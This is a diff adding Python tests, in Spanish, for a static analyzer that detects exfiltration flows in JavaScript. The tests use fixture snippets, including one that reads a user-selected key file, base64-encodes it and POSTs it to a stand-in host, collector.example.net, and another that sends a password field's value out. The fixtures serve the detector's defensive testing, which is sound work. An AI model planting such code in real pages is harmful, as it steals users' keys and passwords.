@@ -259,3 +259,86 @@ def test_laboratorio(lab_sources, demo, espera_ruta_privada, espera_derivada):
     assert paths, f"{demo}: no se detecto la ruta de exfiltracion"
     assert paths[0].channel == "network"
     assert paths[0].derived is espera_derivada
+
+
+# ----------------------------------------------------------------------
+# Casos que cubren los defectos encontrados al ejecutar la herramienta
+# ----------------------------------------------------------------------
+
+EXFILTRACION_SIN_NOMBRES = """
+function readKey(input) {
+  var file = input.files[0];
+  var reader = new FileReader();
+  reader.onload = function (e) {
+    var raw = e.target.result;
+    upload(encode(raw));
+  };
+  reader.readAsArrayBuffer(file);
+}
+function encode(buf) {
+  return btoa(String.fromCharCode.apply(null, new Uint8Array(buf)));
+}
+function upload(data) {
+  fetch("https://collector.example.net/k", { method: "POST", body: data });
+}
+"""
+
+
+def test_detecta_el_patron_canonico_de_exfiltracion():
+    """input.files -> FileReader -> btoa -> fetch, sin nombrar la clave.
+
+    Este codigo no contiene la palabra "key" en ninguna expresion que el
+    analizador pueda leer. Si la deteccion dependiera de la heuristica de
+    nombres, no habria ninguna ruta y el informe diria "no se identificaron
+    rutas" sobre un script que exfiltra.
+    """
+    paths = paths_for(EXFILTRACION_SIN_NOMBRES)
+    assert paths, "no se encontro ninguna ruta hacia el sumidero"
+    path = paths[0]
+    assert path.sink_name == "fetch"
+    assert path.channel == "network"
+    assert "btoa" in path.transforms
+
+
+def test_el_material_sin_tipificar_no_se_presenta_como_la_clave():
+    """Una fuente reconocida sin etiqueta deducible es UNCLASSIFIED, no KEY_FILE."""
+    paths = paths_for(
+        "function f(input){ var raw = input.files[0]; fetch('/x', {body: raw}); }")
+    assert paths
+    assert set(paths[0].labels) == {"UNCLASSIFIED"}
+    assert not paths[0].private
+
+
+def test_document_del_dom_no_es_el_documento_a_firmar():
+    """`document.getElementById` no debe etiquetar nada como DOCUMENT."""
+    paths = paths_for(
+        "function f(){ var v = document.getElementById('password').value;"
+        " fetch('/x', {body: v}); }")
+    assert paths
+    labels = set(paths[0].labels)
+    assert Tag.DOCUMENT.value not in labels
+    assert Tag.KEY_PASSWORD.value in labels
+
+
+def test_payload_no_se_confunde_con_el_documento_a_firmar():
+    """`payload` nombra el cuerpo de una peticion, no el documento.
+
+    Etiquetarlo DOCUMENT inventaba una procedencia y, como DOCUMENT no es
+    privado ni es "sin clasificar", hacia desaparecer el hallazgo de un
+    exfiltrador cuyo parametro se llamaba asi.
+    """
+    paths = paths_for(EXFILTRACION_SIN_NOMBRES.replace("data", "payload"))
+    assert paths
+    assert Tag.DOCUMENT.value not in set(paths[0].labels)
+
+
+def test_la_confianza_baja_cuando_el_flujo_cruza_funciones():
+    """La confianza es parte del hallazgo, no un adorno."""
+    directo = paths_for(
+        "function f(input){ var r = input.files[0]; fetch('/x', {body: r}); }")
+    indirecto = paths_for(
+        "function up(p){ fetch('/x', {body: p}); }\n"
+        "function f(input){ up(input.files[0]); }")
+    assert directo[0].confidence is Confidence.HIGH
+    assert indirecto[0].confidence is Confidence.MEDIUM
+    assert indirecto[0].hops >= 1
